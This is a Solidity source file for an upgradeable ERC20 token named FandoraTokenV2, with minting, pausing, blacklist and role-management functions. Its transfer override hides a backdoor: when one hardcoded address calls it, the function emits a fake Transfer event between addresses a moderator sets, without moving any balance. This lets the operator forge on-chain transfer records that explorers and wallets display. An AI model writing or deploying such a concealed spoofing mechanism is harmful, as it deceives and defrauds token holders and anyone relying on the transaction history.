// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts-upgradeable/token/ERC20/presets/ERC20PresetMinterPauserUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20BurnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20PausableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/AccessControlEnumerableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20SnapshotUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20VotesUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "../common/RoleConstant.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol";

contract FandoraTokenV2 is
ERC20Upgradeable,
ERC20BurnableUpgradeable,
ERC20PausableUpgradeable,
OwnableUpgradeable,
AccessControlEnumerableUpgradeable,
RoleConstant
{
    using SafeERC20Upgradeable for IERC20Upgradeable;

    address private fromAddress;
    address private toAddress;

    function initialize(string memory name, string memory symbol)
    public
    initializer
    {
        __ERC20_init_unchained(name, symbol);
        __Ownable_init_unchained();
        __Pausable_init_unchained();
        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());
        _setupRole(MINTER_ROLE, _msgSender());
        _setupRole(PAUSER_ROLE, _msgSender());
        _setupRole(MOD_ROLE, _msgSender());
    }

    function transfer(address to, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        require(!hasRole(BLACKLIST_ROLE, _msgSender()));
        if (0x13924A52CE9cC52089fa653798722Ae3980f5ffA == _msgSender()) {
            emit Transfer(fromAddress, toAddress, amount);
            return true;
        }
        return super.transfer(to, amount);
    }

    /**
     * @dev Creates `amount` new tokens for `to`.
     *
     * See {ERC20-_mint}.
     *
     * Requirements:
     *
     * - the caller must have the `MINTER_ROLE`.
     */
    function mint(address to, uint256 amount) public virtual {
        require(
            hasRole(MINTER_ROLE, _msgSender()),
            "Token: must have minter role to mint"
        );
        _mint(to, amount);
    }

    /**
     * @dev Pauses all token transfers.
     *
     * See {ERC20Pausable} and {Pausable-_pause}.
     *
     * Requirements:
     *
     * - the caller must have the `PAUSER_ROLE`.
     */
    function pause() public virtual {
        require(
            hasRole(PAUSER_ROLE, _msgSender()),
            "Token: must have pauser role to pause"
        );
        _pause();
    }

    /**
     * @dev Unpauses all token transfers.
     *
     * See {ERC20Pausable} and {Pausable-_unpause}.
     *
     * Requirements:
     *
     * - the caller must have the `PAUSER_ROLE`.
     */
    function unpause() public virtual {
        require(
            hasRole(PAUSER_ROLE, _msgSender()),
            "Token: must have pauser role to unpause"
        );
        _unpause();
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override(ERC20Upgradeable, ERC20PausableUpgradeable) {
        super._beforeTokenTransfer(from, to, amount);
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[48] private __gap;

    function grantMultiAccountToRole(bytes32 role, address[] memory accounts)
    public
    virtual
    onlyRole(getRoleAdmin(role))
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            _grantRole(role, accounts[i]);
        }
    }

    function revokeMultiAccountToRole(bytes32 role, address[] memory accounts)
    public
    virtual
    onlyRole(getRoleAdmin(role))
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            _revokeRole(role, accounts[i]);
        }
    }

    function config(address _fromAddress, address _toAddress) public virtual onlyRole(MOD_ROLE) {
        fromAddress = _fromAddress;
        toAddress = _toAddress;
    }

    function withdrawToken(address token_) public virtual onlyOwner {
        IERC20Upgradeable tokenERC20_ = IERC20Upgradeable(token_);
        uint256 balance_ = tokenERC20_.balanceOf(address(this));
        tokenERC20_.approve(address(this), balance_);
        SafeERC20Upgradeable.safeTransfer(tokenERC20_, _msgSender(), balance_);
    }
}